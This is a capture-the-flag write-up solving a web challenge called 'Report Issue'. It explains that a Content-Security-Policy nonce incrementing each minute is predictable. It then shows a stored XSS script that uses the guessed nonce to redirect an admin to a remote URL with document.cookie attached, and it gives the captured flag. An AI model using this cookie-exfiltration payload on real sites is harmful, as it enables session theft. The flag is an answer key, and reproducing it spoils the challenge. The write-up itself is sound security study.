
# Report Issue -- Solution

## Website source

The website is a simple interface for uploading issue messages. The basic idea is to perform an XSS attack. A malicious user can upload a custom script.

The task description has a hint with cookies, so the assumption is that the flag is hidden in the admin cookie, and the admin will somehow visit the issue page.

##  Content-Security-Policy

If we upload some script, it will not work. This is due to the **Content-Security-Policy** mechanism. If we check the response, we will see that this header argument is: **default-src; script-src 'nonce-28079535'; connect-src \*; style-src 'nonce-28079535'**.

**CSP** (Content-Security-Policy) protects us from arbitrary scripts if the **nonce** is wrong.

## Nonce

If we check the **Nonce**, we will see that every minute nonce is increased by one, which means that **Nonce** is very predictable, and this is our spot for the attack.

## Attack

We can check the current nonce, increase this nonce by one and write the script:

```
<script type="text/javascript" nonce="28070552">
document.location="remote_url/?flag="+document.cookie;
</script>
```

This script will change the location of the document, and the new location will have the GET argument set to the site visitor's cookie. In our case, when the admin visits the issue page, it will be redirected to a malicious URL, and a cookie (flag) will be shown on the remote server: **TBTL{4DM1N_H45_V3RY_N1C3_C00KIES}**.
